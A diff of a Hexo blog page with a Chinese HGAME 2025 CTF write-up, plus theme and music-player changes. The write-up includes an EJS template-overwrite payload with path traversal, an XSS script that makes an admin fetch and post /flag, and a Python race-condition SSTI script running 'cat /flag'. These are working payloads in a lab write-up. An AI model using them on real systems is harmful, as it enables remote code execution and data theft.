@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
 <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
-<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
   <link rel="apple-touch-icon" sizes="180x180" href="/uploads/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon-16x16.png">
@@ -15,10 +14,10 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css">
+  <link rel="stylesheet" href="/lib/animate.css/animate.min.css">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"pm25oo.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"pm25oo.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="HGAME 2025 WriteUpby PM25OO #0000a4 MISCHakuya Want A Girl Friendtxt文件拖入010editor识别为.zip文件，其中flag.txt已加密。继续分析十六进制文件，压缩包结尾后有大量额外数据，观察为png文件反转字节，利用脚本还原顺序，得到图片无法打开，利用CRC爆破还原宽高，得到完整图片（帅🥰）猜测字符串为压缩包密码">
 <meta property="og:type" content="article">
@@ -49,6 +48,27 @@
 
 
 
+
+
+
+
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/ribbon.js/dist/ribbon.min.js" defer></script>
+  <script src="/lib/animejs/lib/anime.min.js" defer></script>
+  <script src="/lib/@next-theme/pjax/pjax.min.js" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="/lib/hexo-generator-searchdb/dist/search.js" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -92,7 +112,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-blogrolls"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>Blogrolls</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-blogrolls"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>Blogrolls</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -254,11 +274,11 @@
 
 <h1 id="HGAME-2025-WriteUp"><a href="#HGAME-2025-WriteUp" class="headerlink" title="HGAME 2025 WriteUp"></a>HGAME 2025 WriteUp</h1><p>by PM25OO #0000a4</p>
 <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h3><p>txt文件拖入010editor识别为.zip文件，其中flag.txt已加密。<br>继续分析十六进制文件，压缩包结尾后有大量额外数据，观察为png文件反转字节，利用脚本还原顺序，得到图片无法打开，利用CRC爆破还原宽高，得到完整图片（帅🥰）<br>猜测字符串为压缩包密码，猜测正确，得到flag  </p>
-<h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p>使用VMware17打开虚拟机镜像，提示攻击者植入webshell，进入<code>/var/www/html</code>进入服务后端文件夹，进入<code>/uploads</code>文件夹，找到植入的<code>shell.php</code>，拿到flag第一部分。<br>返回查看<code>upload_log.txt</code><br><img data-src="https://pic1.imgdb.cn/item/67a9e6d5d0e0a243d4fdfbbb.png"><br>访问攻击者ip<code>121.41.34.25</code>，拿到flag第二部分。<br>根据日志，攻击者试图访问<code>~/Documents/flag_part3</code>，前去查看拿到flag第三部分。结束。</p>
+<h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p>使用VMware17打开虚拟机镜像，提示攻击者植入webshell，进入<code>/var/www/html</code>进入服务后端文件夹，进入<code>/uploads</code>文件夹，找到植入的<code>shell.php</code>，拿到flag第一部分。<br>返回查看<code>upload_log.txt</code><br><img src="https://pic1.imgdb.cn/item/67a9e6d5d0e0a243d4fdfbbb.png"><br>访问攻击者ip<code>121.41.34.25</code>，拿到flag第二部分。<br>根据日志，攻击者试图访问<code>~/Documents/flag_part3</code>，前去查看拿到flag第三部分。结束。</p>
 <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>访问小游戏网站，送死五次得到gift，通过base64解码，得到的并非flag ：）<br>查看js前端代码，CTRL+F搜索gift，得到另外两个base64编码字符串，解码得到真正flag</p>
 <h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><p>看到文件上传入口，起初推测为文件上传漏洞，尝试植入webshell，失败。查看源码</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>猜测为模板覆盖漏洞，尝试写入文件覆盖<code>mortis.ejs</code><br>上传文件<code>mortis.ejs</code>，内容为<code>&lt;%= process.env.FLAG || require(&#39;fs&#39;).readFileSync(&#39;/flag&#39;, &#39;utf8&#39;) %&gt;</code><br>根据express框架目录结构<br><img data-src="https://pic1.imgdb.cn/item/6849af0758cb8da5c845dcff.jpg"><br>模板文件应该在<code>/views</code>下<br>再访问<code>/rename</code>，<code>content</code>为<code>&#123;&quot;oldName&quot;:&quot;mortis.ejs&quot;,&quot;newName&quot;:&quot;../views/mortis.ejs&quot;&#125;</code>进行路径攻击<br>最后刷新重新渲染页面得到flag</p>
+<p>猜测为模板覆盖漏洞，尝试写入文件覆盖<code>mortis.ejs</code><br>上传文件<code>mortis.ejs</code>，内容为<code>&lt;%= process.env.FLAG || require(&#39;fs&#39;).readFileSync(&#39;/flag&#39;, &#39;utf8&#39;) %&gt;</code><br>根据express框架目录结构<br><img src="https://pic1.imgdb.cn/item/6849af0758cb8da5c845dcff.jpg"><br>模板文件应该在<code>/views</code>下<br>再访问<code>/rename</code>，<code>content</code>为<code>&#123;&quot;oldName&quot;:&quot;mortis.ejs&quot;,&quot;newName&quot;:&quot;../views/mortis.ejs&quot;&#125;</code>进行路径攻击<br>最后刷新重新渲染页面得到flag</p>
 <h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>首先弱口令爆破用户名shallot，得到密码888888，访问<code>/flag</code>提示admin才能访问， 查看<code>/admin</code>提到admin会来查看留言板，想到通过留言板xss注入让admin去获取flag写在留言板上，payload如下：  </p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">&#x27;/&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="string">&quot;comment=&quot;</span> + flag</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>访问<code>/admin</code>再回去发现flag出现在留言板上</p>
@@ -269,7 +289,7 @@
 <p>存在<strong>条件竞争漏洞</strong>，编写脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 Flask 服务器</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://146.56.227.88:30098/app&quot;</span></span><br><span class="line"><span class="comment"># 恶意 Payload (SSTI 注入)</span></span><br><span class="line">MALICIOUS_PAYLOAD = <span class="string">&quot;&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read() &#125;&#125;&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_message</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;写入一个消息到服务器&quot;&quot;&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/send&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;message&quot;</span>: message&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = session.post(url, data=data, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;成功写入消息: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;写入消息失败: <span class="subst">&#123;message&#125;</span>, 状态码: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;写入消息时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_benign</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;写入一个普通消息，确保文件进入可预测状态&quot;&quot;&quot;</span></span><br><span class="line">    set_message(<span class="string">&quot;benign&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_malicious</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;写入恶意 Payload，尝试进行 SSTI 注入&quot;&quot;&quot;</span></span><br><span class="line">    set_message(MALICIOUS_PAYLOAD)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_read</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;访问 /read 端点，尝试触发 SSTI 注入&quot;&quot;&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/read&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = session.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attempt</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行一次竞态攻击尝试&quot;&quot;&quot;</span></span><br><span class="line">    set_benign()  <span class="comment"># 先写入普通内容，保证初始状态可预测</span></span><br><span class="line">    t = threading.Timer(<span class="number">0.01</span>, set_malicious)</span><br><span class="line">    t.start()</span><br><span class="line">    time.sleep(<span class="number">0.005</span>)</span><br><span class="line">    result = trigger_read()  <span class="comment"># 读取 /read，检查是否执行了 SSTI 注入</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始尝试触发漏洞...&quot;</span>)</span><br><span class="line">    attempt_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        attempt_count += <span class="number">1</span></span><br><span class="line">        result = attempt()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> result <span class="keyword">or</span> <span class="string">&quot;FLAG&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag：&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> attempt_count % <span class="number">10</span> == <span class="number">0</span>:  <span class="comment"># 每 10 次尝试打印一次进度</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;尝试次数：<span class="subst">&#123;attempt_count&#125;</span>, 返回内容：<span class="subst">&#123;result[:<span class="number">100</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)  </span><br></pre></td></tr></table></figure>
 <p>运行一段时间后得到flag</p>
-<p>over！<br><img data-src="https://pic1.imgdb.cn/item/67a9f845d0e0a243d4fe0025.png"></p>
+<p>over！<br><img src="https://pic1.imgdb.cn/item/67a9f845d0e0a243d4fe0025.png"></p>
 </div>
 </div>
 
@@ -332,6 +352,7 @@
 // 播放列表配置 - 在此处添加或编辑歌曲
 const playlist = [
   // { title: "", path: ""},
+  { title: "Fall of Dusk", path: "https://entertainment-resources.oss-cn-hangzhou.aliyuncs.com/Music/music/Fall%20of%20Dusk.mp3"},
   { title: "Goodbye", path: "https://entertainment-resources.oss-cn-hangzhou.aliyuncs.com/Music/music/Clive%20Farrington%20-%20Goodbye.mp3" },
   { title: "Any Love of Any Kind", path: "https://entertainment-resources.oss-cn-hangzhou.aliyuncs.com/Music/music/Any%20Love%20of%20Any%20Kind.mp3"},
   { title: "Don't Be So Serious", path: "https://entertainment-resources.oss-cn-hangzhou.aliyuncs.com/Music/music/Don%27t%20Be%20So%20Serious.mp3" },
@@ -347,6 +368,7 @@ const playlist = [
 const PlayerState = {
   index: 0,
   isExpanded: false,
+  isLoading: false,
   playlistTimeoutId: null,
   listeners: {},
   
@@ -370,13 +392,6 @@ const PlayerState = {
   font-family: 'SpotifyMix';
   src: url('/fonts/SpotifyMix-Bold.woff2') format('woff2');
   font-weight: 700;
-  font-display: swap;
-}
-
-@font-face {
-  font-family: 'HarmonySans';
-  src: url('/fonts/HarmonyOS_Sans_SC_Regular.woff2') format('woff2');
-  font-weight: 400;
   font-display: swap;
 }
 
@@ -409,7 +424,7 @@ const PlayerState = {
     box-shadow: var(--shadow);
     padding: 16px;
     z-index: 9999;
-    font-family: 'SpotifyMix', 'HarmonySans', sans-serif;
+    font-family: 'SpotifyMix', -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
     display: flex;
     flex-direction: column;
     gap: 10px;
@@ -594,7 +609,7 @@ const PlayerState = {
     box-shadow: var(--shadow);
     padding: 16px;
     z-index: 9998;
-    font-family: 'SpotifyMix', 'HarmonySans', sans-serif;
+    font-family: 'SpotifyMix', -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
     backdrop-filter: var(--blur);
     -webkit-backdrop-filter: var(--blur);
     border: 1px solid var(--border-color);
@@ -669,6 +684,11 @@ const PlayerState = {
     background: rgba(0, 188, 212, 0.6);
     border-radius: 2px;
   }
+  html.harmony-font-loaded #floating-player,
+  html.harmony-font-loaded #playlist-container {
+    font-family: 'SpotifyMix', 'HarmonyOS_Sans_SC_Regular', -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+  }
+
   
   @media (max-width: 480px) {
     #floating-player {
@@ -712,12 +732,10 @@ const PlayerState = {
     </button>
   </div>
   <input type="range" id="progress-bar" min="0" max="100" value="0" readonly>
-  <audio id="bgm-player" preload="auto"></audio>
+  <audio id="bgm-player" preload="none"></audio>
 </div>
 
 <script>
-let index = 0;
-
 const audio = document.getElementById('bgm-player');
 const progressBar = document.getElementById('progress-bar');
 const playPauseButton = document.getElementById('play-pause-button');
@@ -756,29 +774,60 @@ function updateSongTitle() {
   songTitleEl.textContent = playlist[PlayerState.index].title;
 }
 
-function loadSong(i) {
-  PlayerState.index = (i + playlist.length) % playlist.length;
-  const song = playlist[PlayerState.index];
-  updateSongTitle();
-  
-  // 如果当前有音乐在播放，先淡出再切换
-  if (!audio.paused) {
-    fadeOut().then(() => {
-      audio.src = song.path;
-      updatePlaylistActive();
-      audio.play().then(async () => {
-        await fadeIn();
-        playPauseButton.classList.add('playing');
-      });
-    });
-  } else {
-    audio.src = song.path;
-    updatePlaylistActive();
-    audio.play().then(async () => {
-      await fadeIn();
-      playPauseButton.classList.add('playing');
-    });
+// 仅在用户开始播放或主动切歌时设置 src，避免音频进入首屏加载队列。
+function ensureSongSource() {
+  const sourceIndex = String(PlayerState.index);
+
+  if (audio.dataset.songIndex === sourceIndex) {
+    return;
   }
+
+  audio.src = playlist[PlayerState.index].path;
+  audio.dataset.songIndex = sourceIndex;
+  audio.load();
+}
+
+function setLoadingState(isLoading) {
+  PlayerState.isLoading = isLoading;
+  playPauseButton.setAttribute('aria-busy', String(isLoading));
+}
+
+async function startPlayback() {
+  if (PlayerState.isLoading) {
+    return;
+  }
+
+  setLoadingState(true);
+  ensureSongSource();
+  audio.volume = 0;
+
+  try {
+    // play() 返回 Promise；媒体在页面渲染完成后按需异步加载。
+    await audio.play();
+    await fadeIn();
+    playPauseButton.classList.add('playing');
+  } catch (error) {
+    playPauseButton.classList.remove('playing');
+    console.warn('歌曲加载或播放失败：', error);
+  } finally {
+    setLoadingState(false);
+  }
+}
+
+async function loadSong(i) {
+  if (PlayerState.isLoading) {
+    return;
+  }
+
+  if (!audio.paused) {
+    await fadeOut();
+    audio.pause();
+  }
+
+  PlayerState.index = (i + playlist.length) % playlist.length;
+  updateSongTitle();
+  updatePlaylistActive();
+  await startPlayback();
 }
 
 function prevSong() {
@@ -789,17 +838,17 @@ function nextSong() {
   loadSong(PlayerState.index + 1);
 }
 
-function togglePlay() {
+async function togglePlay() {
+  if (PlayerState.isLoading) {
+    return;
+  }
+
   if (audio.paused) {
-    audio.play().then(async () => {
-      await fadeIn();
-      playPauseButton.classList.add('playing');
-    });
+    await startPlayback();
   } else {
-    fadeOut().then(() => {
-      audio.pause();
-      playPauseButton.classList.remove('playing');
-    });
+    await fadeOut();
+    audio.pause();
+    playPauseButton.classList.remove('playing');
   }
 }
 
@@ -890,9 +939,6 @@ audio.addEventListener('timeupdate', () => {
 document.addEventListener('DOMContentLoaded', function () {
   generatePlaylist();
   updateSongTitle();
-  
-  // 加载第一首歌但不播放
-  audio.src = playlist[0].path;
   updatePlaylistActive();
   
   // 初始状态：收缩为药丸形
@@ -904,7 +950,9 @@ document.addEventListener('DOMContentLoaded', function () {
 window.addEventListener('beforeunload', () => {
   PlayerState.cleanup();
   audio.pause();
-  audio.src = '';
+  audio.removeAttribute('src');
+  audio.removeAttribute('data-song-index');
+  audio.load();
 });
 </script>
 
@@ -930,29 +978,6 @@ window.addEventListener('beforeunload', () => {
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script size="300" alpha="0.6" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 <script class="next-config" data-name="giscus" type="application/json">{"enable":true,"repo":"PM25OO/PM25OO.github.io","repo_id":"R_kgDONjexfw","category":"Announcements","category_id":"DIC_kwDONjexf84CumIW","mapping":"pathname","strict":0,"reactions_enabled":1,"emit_metadata":0,"theme":"light","lang":"zh-CN","crossorigin":"anonymous","input_position":"top","loading":"lazy"}</script>
 
 <script>
@@ -1116,6 +1141,60 @@ document.addEventListener('page:loaded', () => {
     initLinksPage();
   }
   
+})();
+</script>
+
+<script>
+(function() {
+  'use strict';
+
+  var fontFamily = 'HarmonyOS_Sans_SC_Regular';
+  var fontUrl = '/fonts/HarmonyOS_Sans_SC_Regular.woff2';
+  var loadedClass = 'harmony-font-loaded';
+
+  function shouldSkipDeferredFont() {
+    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return connection && (
+      connection.saveData ||
+      connection.effectiveType === 'slow-2g' ||
+      connection.effectiveType === '2g'
+    );
+  }
+
+  async function loadDeferredFont() {
+    if (!('FontFace' in window) || !document.fonts || shouldSkipDeferredFont()) {
+      return;
+    }
+
+    try {
+      var fontFace = new FontFace(
+        fontFamily,
+        'url("' + fontUrl + '") format("woff2")',
+        { style: 'normal', weight: '400' }
+      );
+      var loadedFont = await fontFace.load();
+      document.fonts.add(loadedFont);
+      document.documentElement.classList.add(loadedClass);
+    } catch (error) {
+      console.warn('中文设计字体后台加载失败：', error);
+    }
+  }
+
+  function scheduleDeferredFont() {
+    setTimeout(function() {
+      if ('requestIdleCallback' in window) {
+        requestIdleCallback(loadDeferredFont, { timeout: 5000 });
+      } else {
+        loadDeferredFont();
+      }
+    }, 3000);
+  }
+
+  if (document.readyState === 'complete') {
+    scheduleDeferredFont();
+  } else {
+    window.addEventListener('load', scheduleDeferredFont, { once: true });
+  }
 })();
 </script>
 
